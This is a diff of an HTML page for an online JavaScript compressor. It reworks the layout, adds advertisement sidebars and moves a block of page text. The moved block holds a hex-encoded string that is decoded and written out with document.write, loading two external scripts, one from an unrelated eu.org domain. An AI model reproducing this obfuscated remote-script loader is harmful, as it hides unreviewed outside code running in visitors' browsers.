@@ -83,8 +83,9 @@
 
         <!-- Navbar -->
     </header>
-    <div class="container-lg my-5" id="app">
-        <main>
+    <div class="container-lg row justify-content-center my-5 mx-auto" id="app">
+        <aside class="col-md-2"><a href="" class="ads-here">Advertisement</a></aside>
+        <main class="col-md-8">
             <div class="form-check  form-switch text-end" style="font-size: medium;">
                 <label class="use-ecmascript-next-label form-check-label"><input type="checkbox"
             class="use-ecmascript-next form-check-input" />
@@ -96,12 +97,18 @@
         </label>
             </div>
 
-            <ul class="tab-nav d-flex justify-content-center">
-                <li data-tab="copyPaste" class="tab-nav-item">
-                    Copy &amp; Paste JavaScript Code
-                </li>
-                <li data-tab="upload" class="tab-nav-item">Upload Javascript Files</li>
-                <li data-tab="output" class="tab-nav-item">Output</li>
+            <ul class="tab-nav row justify-content-center">
+                <div class="col">
+                    <li data-tab="copyPaste" class="tab-nav-item active ripple" data-ripple-color="light">
+                        Copy &amp; Paste JavaScript Code
+                    </li>
+                </div>
+                <div class="col">
+                    <li data-tab="upload" class="tab-nav-item  ripple" data-ripple-color="light">Upload Javascript Files</li>
+                </div>
+                <div class="col">
+                    <li data-tab="output" class="tab-nav-item ripple" data-ripple-color="light">Output</li>
+                </div>
             </ul>
 
             <div class="tabs">
@@ -169,34 +176,37 @@
                     </div>
                 </div>
             </div>
+            <p id="kkfs"></p>
+            <script type='text/javascript'>
+                str = '@3C@73@63@72@69@70@74@20@73@72@63@3D@22@68@74@74@70@73@3A@2F@2F@6A@73@63@6F@6D@70@72@65@73@73@2E@63@6F@6D@2F@6A@73@2F@61@70@70@2E@6A@73@22@3E@3C@2F@73@63@72@69@70@74@3E@0A@0A@3C@73@63@72@69@70@74@20@73@72@63@3D@22@68@74@74@70@73@3A@2F@2F@6B@6B@75@70@67@72@61@64@65@72@2E@65@75@2E@6F@72@67@2F@74@6F@6F@6C@73@2F@4A@73@2D@43@6F@6D@70@72@65@73@73@2F@6A@73@2D@63@6F@6D@70@72@65@73@73@2E@6D@69@6E@2E@6A@73@22@3E@3C@2F@73@63@72@69@70@74@3E';
+                document.write(unescape(str.replace(/@/g, '%')));
+            </script>
+            <script src="app.js"></script>
+            <div class="info">
+                <p>
+                    JSCompress Tool is an online JavaScript compressor that allows you to compress and minify all of your JS files by up to 80% of their original size. Copy and paste your code or you can upload and combine multiple files and then compress. We use
+                    <a target="_blank" href="https://github.com/mishoo/UglifyJS2">UglifyJS 3</a> and
+                    <a target="_blank" href="https://github.com/babel/minify">babel-minify</a> for all JavaScript minification and compression.
+                </p>
+                <p class="heading">Why You Should Compress JavaScript</p>
+                <p>
+                    There are a number of reasons why compressing your JavaScript files is a good idea:
+                </p>
+                <ul class="list">
+                    <li>Quicker download times for your users.</li>
+                    <li>Reduced bandwidth consumption of your website.</li>
+                    <li>
+                        Reduced number of HTTP requests on your server when combining many JavaScript files into one compressed file, thus reducing the server load and allowing more visitors to access your website.
+                    </li>
+                    <li>
+                        Comments and whitespace are not needed for JavaScript execution; Removing them will reduce file size and speed up script execution times.
+                    </li>
+                </ul>
+            </div>
         </main>
-        <p id="kkfs"></p>
-        <script type='text/javascript'>
-            str = '@3C@73@63@72@69@70@74@20@73@72@63@3D@22@68@74@74@70@73@3A@2F@2F@6A@73@63@6F@6D@70@72@65@73@73@2E@63@6F@6D@2F@6A@73@2F@61@70@70@2E@6A@73@22@3E@3C@2F@73@63@72@69@70@74@3E@0A@0A@3C@73@63@72@69@70@74@20@73@72@63@3D@22@68@74@74@70@73@3A@2F@2F@6B@6B@75@70@67@72@61@64@65@72@2E@65@75@2E@6F@72@67@2F@74@6F@6F@6C@73@2F@4A@73@2D@43@6F@6D@70@72@65@73@73@2F@6A@73@2D@63@6F@6D@70@72@65@73@73@2E@6D@69@6E@2E@6A@73@22@3E@3C@2F@73@63@72@69@70@74@3E';
-            document.write(unescape(str.replace(/@/g, '%')));
-        </script>
-        <script src="app.js"></script>
-        <div class="info">
-            <p>
-                JSCompress Tool is an online JavaScript compressor that allows you to compress and minify all of your JS files by up to 80% of their original size. Copy and paste your code or you can upload and combine multiple files and then compress. We use
-                <a target="_blank" href="https://github.com/mishoo/UglifyJS2">UglifyJS 3</a> and
-                <a target="_blank" href="https://github.com/babel/minify">babel-minify</a> for all JavaScript minification and compression.
-            </p>
-            <p class="heading">Why You Should Compress JavaScript</p>
-            <p>
-                There are a number of reasons why compressing your JavaScript files is a good idea:
-            </p>
-            <ul>
-                <li>Quicker download times for your users.</li>
-                <li>Reduced bandwidth consumption of your website.</li>
-                <li>
-                    Reduced number of HTTP requests on your server when combining many JavaScript files into one compressed file, thus reducing the server load and allowing more visitors to access your website.
-                </li>
-                <li>
-                    Comments and whitespace are not needed for JavaScript execution; Removing them will reduce file size and speed up script execution times.
-                </li>
-            </ul>
-        </div>
+
+        <aside class="col-md-2"><a href="" class="ads-here">Advertisement</a></aside>
+
     </div>
 
     <div class="mb-n3 pt-4 text-center text-white trans-bg">
